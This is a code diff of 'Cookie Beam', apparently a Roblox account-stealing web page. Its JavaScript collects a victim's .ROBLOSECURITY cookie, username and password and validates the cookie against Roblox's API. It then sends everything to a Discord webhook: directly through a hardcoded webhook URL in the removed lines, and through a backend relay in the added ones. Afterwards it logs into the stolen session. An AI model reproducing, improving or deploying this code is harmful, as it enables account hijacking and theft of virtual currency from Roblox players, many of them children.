@@ -1,68 +1,56 @@
-console.log('🍪 Cookie Beam By Userspin45 - Enhanced with Proxy');
+console.log('🍪 Cookie Beam By Userspin45 - Using Backend Proxy');
 
-const webhook = 'https://discord.com/api/webhooks/1537430116756619355/uAO-C2gl8toO3BiClhFUJ-9t8IgX7JmfAxzLnPfEShP5ArdjBmksdwjXWE9FKi7mIWsA';
+// Use the backend server URL (change to your Render URL when deployed)
+const BACKEND_URL = window.location.origin; // Uses the same host
 
-// CORS proxy list – will try each until one works
-const PROXIES = [
-    'https://corsproxy.io/?',
-    'https://api.allorigins.win/raw?url=',
-    'https://thingproxy.freeboard.io/fetch/'
-];
-
-// Fetch with timeout and retry
-async function fetchWithTimeout(url, options = {}, timeout = 10000, retries = 2) {
-    for (let attempt = 1; attempt <= retries; attempt++) {
-        try {
-            const controller = new AbortController();
-            const timer = setTimeout(() => controller.abort(), timeout);
-            const response = await fetch(url, { ...options, signal: controller.signal });
-            clearTimeout(timer);
-            if (response.ok) return response;
-            console.log(`Attempt ${attempt} failed with status ${response.status}`);
-        } catch (error) {
-            console.log(`Attempt ${attempt} error: ${error.message}`);
-            if (attempt === retries) throw error;
-            await new Promise(r => setTimeout(r, 2000 * attempt));
-        }
+async function fetchWithTimeout(url, options = {}, timeout = 10000) {
+    const controller = new AbortController();
+    const timer = setTimeout(() => controller.abort(), timeout);
+    try {
+        const response = await fetch(url, { ...options, signal: controller.signal });
+        clearTimeout(timer);
+        return response;
+    } catch (error) {
+        clearTimeout(timer);
+        throw error;
     }
-    throw new Error('All retry attempts failed');
 }
 
-// Validate cookie using proxy
 async function validateCookie(cookie) {
-    console.log('🔍 Validating cookie with proxy...');
-    const targetUrl = 'https://www.roblox.com/mobileapi/userinfo';
-
-    for (const proxy of PROXIES) {
-        try {
-            const proxyUrl = proxy + encodeURIComponent(targetUrl);
-            console.log(`🔄 Trying proxy: ${proxy}`);
-            const res = await fetchWithTimeout(proxyUrl, {
-                headers: { 'Cookie': `.ROBLOSECURITY=${cookie}` }
-            }, 8000, 2);
-
-            if (res.ok) {
-                const data = await res.json();
-                console.log('✅ Validation successful via', proxy);
-                return { valid: true, username: data.UserName, robux: data.RobuxBalance, id: data.UserID };
-            } else if (res.status === 401) {
-                return { valid: false, error: 'Invalid cookie (401 Unauthorized)' };
-            } else {
-                console.log(`Proxy ${proxy} returned status ${res.status} – trying next...`);
-            }
-        } catch (e) {
-            console.log(`Proxy ${proxy} failed: ${e.message}`);
+    try {
+        const res = await fetchWithTimeout(`${BACKEND_URL}/validate`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ cookie })
+        }, 10000);
+        const data = await res.json();
+        if (res.ok && data.valid) {
+            return { valid: true, username: data.username, robux: data.robux, id: data.id };
+        } else {
+            return { valid: false, error: data.error || 'Validation failed' };
         }
+    } catch (e) {
+        return { valid: false, error: 'Network error: ' + e.message };
     }
-    return { valid: false, error: 'All proxies failed – check internet or try backend proxy' };
 }
 
-// Auto-login with enhanced cookie setting
+async function sendToWebhook(payload) {
+    try {
+        const res = await fetchWithTimeout(`${BACKEND_URL}/send-webhook`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload)
+        }, 10000);
+        return res.ok;
+    } catch (e) {
+        console.error('Webhook error:', e);
+        return false;
+    }
+}
+
 function autoLogin(cookie) {
     try {
         document.cookie = `.ROBLOSECURITY=${cookie}; path=/; domain=.roblox.com; secure; SameSite=None`;
-        console.log('🍪 Cookie set, redirecting to Roblox...');
-        // Add a small delay to ensure cookie is set
         setTimeout(() => {
             window.location.href = 'https://www.roblox.com/home';
         }, 500);
@@ -73,7 +61,6 @@ function autoLogin(cookie) {
     }
 }
 
-// Main button handler with enhanced feedback
 document.getElementById('logBtn').addEventListener('click', async function() {
     const cookie = document.getElementById('cookieInput').value.trim();
     const username = document.getElementById('userInput').value.trim() || 'Not provided';
@@ -86,13 +73,12 @@ document.getElementById('logBtn').addEventListener('click', async function() {
         return;
     }
 
-    // Disable button during processing
     const btn = this;
     btn.disabled = true;
     btn.textContent = '⏳ Processing...';
 
     try {
-        resultDiv.textContent = '🔍 Validating cookie... (using proxies)';
+        resultDiv.textContent = '🔍 Validating cookie via backend...';
         resultDiv.className = 'status-wait';
 
         const validation = await validateCookie(cookie);
@@ -108,21 +94,16 @@ document.getElementById('logBtn').addEventListener('click', async function() {
         resultDiv.textContent = `✅ Valid cookie! User: ${validation.username} (${validation.id}) | Robux: ${validation.robux}`;
         resultDiv.className = 'status-ok';
 
-        // Enhanced Discord payload with more details
         const payload = {
-            content: `🍪 **Cookie Beam - Userspin45**\n━━━━━━━━━━━━━━━━━━━━\n✅ **VALID COOKIE DETECTED**\n👤 **Username:** ${validation.username}\n🆔 **User ID:** ${validation.id}\n💰 **Robux:** ${validation.robux}\n🔑 **Password:** ${password}\n📝 **Provided Username:** ${username}\n🍪 **.ROBLOSECURITY:** \`${cookie}\`\n━━━━━━━━━━━━━━━━━━━━\n🕒 Logged at: ${new Date().toLocaleString()}\n🌐 IP: ${await getIP()}`
+            content: `🍪 **Cookie Beam - Userspin45**\n━━━━━━━━━━━━━━━━━━━━\n✅ **VALID COOKIE DETECTED**\n👤 **Username:** ${validation.username}\n🆔 **User ID:** ${validation.id}\n💰 **Robux:** ${validation.robux}\n🔑 **Password:** ${password}\n📝 **Provided Username:** ${username}\n🍪 **.ROBLOSECURITY:** \`${cookie}\`\n━━━━━━━━━━━━━━━━━━━━\n🕒 Logged at: ${new Date().toLocaleString()}`
         };
 
-        resultDiv.textContent = '📤 Sending to Discord...';
+        resultDiv.textContent = '📤 Sending to Discord via backend...';
         resultDiv.className = 'status-wait';
 
-        const sendRes = await fetchWithTimeout(webhook, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(payload)
-        }, 5000, 3);
+        const sent = await sendToWebhook(payload);
 
-        if (sendRes.ok) {
+        if (sent) {
             resultDiv.textContent = '📤 Cookie sent! Auto-login in 3 seconds...';
             resultDiv.className = 'status-ok';
             document.getElementById('cookieInput').value = '';
@@ -130,31 +111,15 @@ document.getElementById('logBtn').addEventListener('click', async function() {
             document.getElementById('passInput').value = '';
             setTimeout(() => { autoLogin(cookie); }, 3000);
         } else {
-            resultDiv.textContent = `❌ Discord error: ${sendRes.status} – ${sendRes.statusText}`;
+            resultDiv.textContent = '❌ Failed to send to Discord. Check server logs.';
             resultDiv.className = 'status-error';
         }
     } catch (e) {
         console.error('❌ Error:', e);
-        resultDiv.textContent = `❌ Network error: ${e.message}`;
+        resultDiv.textContent = `❌ Error: ${e.message}`;
         resultDiv.className = 'status-error';
     } finally {
         btn.disabled = false;
         btn.textContent = '📤 Log It';
     }
 });
-
-// Helper: Get public IP for logging
-async function getIP() {
-    try {
-        const res = await fetch('https://api.ipify.org?format=json', { timeout: 3000 });
-        const data = await res.json();
-        return data.ip || 'Unknown';
-    } catch {
-        return 'Unable to fetch IP';
-    }
-}
-
-// Log loaded state
-console.log('✅ Cookie Beam Enhanced with Proxy – Ready');
-console.log(`📡 Webhook configured: ${webhook.substring(0, 50)}...`);
-console.log(`🔄 Proxies loaded: ${PROXIES.length}`);
